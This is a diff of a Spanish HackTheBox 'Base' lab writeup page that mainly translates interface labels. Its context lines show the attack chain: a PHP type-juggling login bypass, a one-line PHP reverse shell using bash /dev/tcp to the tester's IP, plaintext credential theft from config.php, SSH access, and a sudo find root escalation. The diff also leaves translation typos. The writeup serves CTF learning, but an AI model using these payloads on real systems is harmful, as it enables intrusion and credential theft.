@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Base — HackTheBox Writeup | Brandeiks</title>
-  <meta name="description" content="Writeup de la máquina Base de HackTheBox — Dificultad: Fácil. Directory Listing → PHP Type Juggling → File Upload → RCE → Credenciales en texto plano → SSH → sudo find LPE.">
+  <meta name="description" content="Writeup de la máquina Base de HackTheBox — Dificultad: Fácil. Directory Listing → PHP Type Juggling → Subida de Archivos → RCE → Credenciales en texto plano → SSH → sudo find LPE.">
   <meta name="author" content="Brandon Zevallos Pastrana">
   <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
@@ -140,7 +140,7 @@
     .val-red    { color: var(--red); }
     .val-facil  { color: #00ffcc; }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -315,32 +315,33 @@
 <div class="cursor-ring" id="cursorRing"></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">hackthebox</a> /
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
       <span>base</span>
-    </p>
+    </div>
     <h1 class="writeup-title"><span style="color:var(--green)">Base</span></h1>
-    <p class="writeup-subtitle">HackTheBox — Linux · Dir Listing → PHP Type Juggling → File Upload → RCE → Credenciales SSH → sudo find LPE</p>
+    <p class="writeup-subtitle">HackTheBox — Linux · Listado de directorios → PHP Type Juggling → Subida de archivos → RCE → Credenciales SSH → LPE con sudo find</p>
     <div class="writeup-meta">
       <span class="meta-badge badge-facil">● FÁCIL</span>
       <span class="meta-badge badge-htb">HACKTHEBOX</span>
       <span class="meta-badge badge-linux">LINUX</span>
       <span class="meta-badge badge-php">PHP TYPE JUGGLING</span>
-      <span class="meta-badge badge-upload">FILE UPLOAD</span>
+      <span class="meta-badge badge-upload">SUBIDA DE ARCHIVOS</span>
       <span class="meta-badge badge-rce">RCE</span>
       <span class="meta-badge badge-sudo">SUDO · LPE</span>
-      <span class="meta-date">📅 Mayo 2026 · By Brandeiks</span>
+      <span class="meta-date">📅 Mayo 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -358,8 +359,8 @@
         <li><a href="#enumeracion">03 · Enumeración Web</a></li>
         <li><a href="#dirlisting">04 · Directory Listing</a></li>
         <li><a href="#bypass">05 · Auth Bypass · Type Juggling</a></li>
-        <li><a href="#upload">06 · File Upload · RCE</a></li>
-        <li><a href="#shell">07 · Reverse Shell</a></li>
+        <li><a href="#upload">06 · Subida de archivos · RCE</a></li>
+        <li><a href="#shell">07 · Reverse shell</a></li>
         <li><a href="#creds">08 · Credenciales &amp; SSH</a></li>
         <li><a href="#privesc">09 · Privesc · sudo find</a></li>
         <li><a href="#referencia">10 · Referencia de Comandos</a></li>
@@ -371,24 +372,24 @@
       <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
       <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu)</span></div>
       <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
-      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.5.82</span></div>
+      <div class="info-row"><span class="info-label">IP objetivo</span><span class="info-val" style="color:var(--text)">10.129.5.82</span></div>
       <div class="info-row"><span class="info-label">Web</span><span class="info-val val-cyan">Apache 2.4.29</span></div>
       <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
     </div>
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>nmap</span> → puertos 22/80</div></div>
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>gobuster</span> → /login /forms /_uploaded</div></div>
         <div class="ap-line"></div>
-        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Dir Listing</span> → login.php.swp</div></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Listado de directorios</span> → login.php.swp</div></div>
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Type Juggling</span> → bypass auth</div></div>
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>PHP Upload</span> → RCE</div></div>
         <div class="ap-line"></div>
-        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>config.php</span> → creds admin</div></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>config.php</span> → credenciales admin</div></div>
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SSH</span> → john@base</div></div>
         <div class="ap-line"></div>
@@ -454,7 +455,7 @@
           <tr><td>Enum. Web</td><td>gobuster dir -u http://10.129.5.82 -w big.txt -x php</td><td>Directorios: /login, /forms, /_uploaded, upload.php</td></tr>
           <tr><td>Dir. Listing</td><td>Acceso a http://10.129.5.82/login/</td><td>login.php.swp expuesto → código fuente del login</td></tr>
           <tr><td>Auth Bypass</td><td>Burp Suite → password[]=  (array vacío)</td><td>PHP strcmp() devuelve 0 → autenticación eludida</td></tr>
-          <tr><td>File Upload</td><td>Subida de xp.php (reverse shell)</td><td>Archivo accesible en /_uploaded/xp.php</td></tr>
+          <tr><td>Subida de archivos</td><td>Subida de xp.php (reverse shell)</td><td>Archivo accesible en /_uploaded/xp.php</td></tr>
           <tr><td>RCE</td><td>nc -lvnp 443 → acceso a /_uploaded/xp.php</td><td>Shell como www-data</td></tr>
           <tr><td>Creds</td><td>cat /var/www/html/login/config.php</td><td>admin:thisisagoodpassword · usuario john</td></tr>
           <tr><td>Acceso SSH</td><td>ssh john@10.129.5.82</td><td>Shell como john · user.txt obtenido</td></tr>
@@ -490,7 +491,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.5.82 -oX base.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">RECONOCIMIENTO</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">10.129.5.82</span> <span class="flag">-oX</span> <span class="arg">base.xml</span></span></div>
       </div>
@@ -534,7 +535,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc base.xml -o base.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">REPORTE</span>
         <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">base.xml</span> <span class="flag">-o</span> <span class="arg">base.html</span></span></div>
       </div>
@@ -584,7 +585,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="gobuster dir -u http://10.129.5.82 -w /usr/share/wordlists/dirb/big.txt -t 10 -x php">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">ENUMERACIÓN</span>
         <div><span class="prompt">$ </span><span class="cmd">gobuster <span class="arg">dir</span> <span class="flag">-u</span> <span class="arg">http://10.129.5.82</span> <span class="flag">-w</span> <span class="arg">/usr/share/wordlists/dirb/big.txt</span> <span class="flag">-t</span> <span class="arg">10</span> <span class="flag">-x</span> <span class="arg">php</span></span></div>
       </div>
@@ -675,7 +676,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="strings login.php.swp">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">ANÁLISIS</span>
         <div><span class="prompt">$ </span><span class="cmd">strings <span class="arg">login.php.swp</span></span></div>
       </div>
@@ -745,7 +746,7 @@
 
       <div class="info-box">
         <p class="info-box-title">// RESULTADO DEL BYPASS</p>
-        <p>Al enviar la petición modificada, el servidor responde con una redirección a <strong>/upload.php</strong> y nos establece una sesión autenticada como administrador. Accedemos al panel <strong>Admin File Uploads</strong> donde podemos subir archivos al servidor sin restricciones visibles.</p>
+        <p>Al enviar la petición modificada, el servidor responde con una redirección a <strong>/upload.php</strong> y nos establece una sesión autenticada como administrador. Accedemos al panel <strong>Admin Subida de archivoss</strong> donde podemos subir archivos al servidor sin restricciones visibles.</p>
       </div>
 
       <div class="cred-box">
@@ -766,10 +767,10 @@
 
     <hr class="divider">
 
-    <!-- FILE UPLOAD -->
+    <!-- SUBIDA DE ARCHIVOS -->
     <div class="section" id="upload">
       <p class="section-label">// 06</p>
-      <h2 class="section-title">File Upload — Webshell PHP</h2>
+      <h2 class="section-title">Subida de archivos — Webshell PHP</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -782,7 +783,7 @@
           El servidor corre PHP (confirmado por los archivos .php encontrados con Gobuster), lo que
           significa que si logramos subir un archivo <span class="hl-red">.php</span> malicioso,
           el servidor lo <strong>ejecutará</strong> cuando lo solicitemos. A esto se le llama
-          <span class="hl-red">Remote Code Execution (RCE)</span> mediante File Upload.
+          <span class="hl-red">Remote Code Execution (RCE)</span> mediante Subida de archivos.
         </p>
         <p>
           Creamos un archivo PHP de una línea que ejecuta una
@@ -796,7 +797,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="echo '<?php exec(&quot;/bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.10.16.5/443 0&gt;&amp;1&apos;&quot;);?>' > xp.php">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">WEBSHELL</span>
         <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">xp.php</span></span></div>
         <div>&nbsp;</div>
@@ -842,7 +843,7 @@
     <!-- REVERSE SHELL -->
     <div class="section" id="shell">
       <p class="section-label">// 07</p>
-      <h2 class="section-title">Reverse Shell — Acceso Inicial como www-data</h2>
+      <h2 class="section-title">Reverse shell — Acceso Inicial como www-data</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -861,7 +862,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="nc -lvnp 443">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">LISTENER</span>
         <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-lvnp</span> <span class="arg">443</span></span></div>
       </div>
@@ -921,7 +922,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="cat /var/www/html/login/config.php">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">POST-EXPLOT</span>
         <div><span class="prompt">www-data@base:/var/www/html$</span></div>
         <div><span class="prompt">$ </span><span class="cmd">cd <span class="arg">login</span> &amp;&amp; cat <span class="arg">config.php</span></span></div>
@@ -944,7 +945,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="cd /home && ls">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">ENUM LOCAL</span>
         <div><span class="prompt">$ </span><span class="cmd">cd <span class="arg">/home</span> &amp;&amp; ls</span></div>
       </div>
@@ -970,7 +971,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ssh john@10.129.5.82">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSH</span>
         <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">john@10.129.5.82</span></span></div>
       </div>
@@ -1013,7 +1014,7 @@
     <!-- PRIVESC -->
     <div class="section" id="privesc">
       <p class="section-label">// 09</p>
-      <h2 class="section-title">Escalada de Privilegios — sudo /usr/bin/find</h2>
+      <h2 class="section-title">Escalada de privilegios — sudo /usr/bin/find</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -1031,7 +1032,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo -l">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PRIVESC</span>
         <div><span class="prompt">john@base:~$ </span><span class="cmd">sudo <span class="flag">-l</span></span></div>
       </div>
@@ -1068,7 +1069,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo /usr/bin/find . -exec /bin/sh \; -quit">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PRIVESC ROOT</span>
         <div><span class="prompt">john@base:~$ </span><span class="cmd">sudo <span class="arg">/usr/bin/find</span> <span class="arg">.</span> <span class="flag">-exec</span> <span class="arg">/bin/sh</span> <span class="arg">\;</span> <span class="flag">-quit</span></span></div>
       </div>
@@ -1205,7 +1206,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Directory Listing — Listado de Directorios Apache</div>
+          <div class="glos-term">Directory Listing — Listado de directorios Apache</div>
           <div class="glos-def">El <strong>directory listing</strong> ocurre cuando Apache muestra el contenido completo de una carpeta porque: (1) no existe un archivo index (index.html, index.php) en el directorio, y (2) la directiva <code>Options +Indexes</code> está habilitada o no se ha deshabilitado con <code>Options -Indexes</code>. Expone toda la estructura de archivos del servidor al visitante, incluyendo archivos de configuración, backups, archivos swap y otros archivos sensibles. En producción nunca debe estar habilitado. Se desactiva añadiendo <code>Options -Indexes</code> en la configuración de Apache o en <code>.htaccess</code>.</div>
         </div>
 
@@ -1215,17 +1216,17 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">File Upload sin Validación — Remote Code Execution (RCE)</div>
-          <div class="glos-def">Una vulnerabilidad de <strong>File Upload</strong> sin validación permite que un atacante suba cualquier tipo de archivo al servidor, incluyendo scripts ejecutables. En un servidor PHP, si el directorio de uploads tiene permisos de ejecución PHP, cualquier archivo <code>.php</code> subido será <strong>ejecutado por el servidor</strong> cuando se realice una petición HTTP al archivo. Una <strong>reverse shell PHP</strong> es un script que, al ejecutarse en el servidor, establece una conexión TCP de vuelta al atacante entregando control total del sistema. La validación correcta incluye: verificar el tipo MIME real del archivo (no la extensión), usar una lista blanca de extensiones permitidas, almacenar archivos subidos fuera del webroot o en un directorio sin permisos de ejecución PHP.</div>
+          <div class="glos-term">Subida de archivos sin Validación — Remote Code Execution (RCE)</div>
+          <div class="glos-def">Una vulnerabilidad de <strong>Subida de archivos</strong> sin validación permite que un atacante suba cualquier tipo de archivo al servidor, incluyendo scripts ejecutables. En un servidor PHP, si el directorio de uploads tiene permisos de ejecución PHP, cualquier archivo <code>.php</code> subido será <strong>ejecutado por el servidor</strong> cuando se realice una petición HTTP al archivo. Una <strong>reverse shell PHP</strong> es un script que, al ejecutarse en el servidor, establece una conexión TCP de vuelta al atacante entregando control total del sistema. La validación correcta incluye: verificar el tipo MIME real del archivo (no la extensión), usar una lista blanca de extensiones permitidas, almacenar archivos subidos fuera del webroot o en un directorio sin permisos de ejecución PHP.</div>
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Reverse Shell — bash -i &gt;&amp; /dev/tcp</div>
+          <div class="glos-term">Reverse shell — bash -i &gt;&amp; /dev/tcp</div>
           <div class="glos-def">Una <strong>reverse shell</strong> es una técnica donde el servidor víctima inicia la conexión hacia el atacante (al contrario de una bind shell, donde el atacante se conecta al servidor). Esto elude firewalls que bloquean conexiones entrantes pero permiten las salientes. El mecanismo <code>/dev/tcp/IP/PUERTO</code> es una función especial de <strong>Bash</strong> que abre un socket TCP hacia la IP y puerto especificados. Combinado con <code>bash -i</code> (bash interactivo) y la redirección <code>&gt;&amp; ... 0&gt;&amp;1</code> (redirigir stdout/stderr y stdin al socket), obtenemos una shell completa a través de la conexión TCP. El atacante escucha con <strong>netcat</strong> (<code>nc -lvnp PUERTO</code>) y recibe la conexión.</div>
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Credenciales en Texto Plano — Clear Text Credentials</div>
+          <div class="glos-term">Credenciales en Texto Plano — Clear Text Credenciales</div>
           <div class="glos-def">Almacenar contraseñas en <strong>texto plano</strong> (sin cifrar ni hashear) en archivos de configuración es una práctica gravemente insegura. Si un atacante obtiene acceso de lectura a esos archivos (mediante RCE, path traversal, LFI u otro vector), obtiene las contraseñas reales inmediatamente. La práctica correcta es almacenar <strong>hashes</strong> de contraseñas con algoritmos modernos como <strong>bcrypt</strong>, <strong>Argon2</strong> o <strong>scrypt</strong>, que son resistentes a ataques de fuerza bruta. Las credenciales de configuración de base de datos deben almacenarse en variables de entorno o en archivos fuera del webroot con permisos restrictivos.</div>
         </div>
 
@@ -1257,9 +1258,9 @@
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Base · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
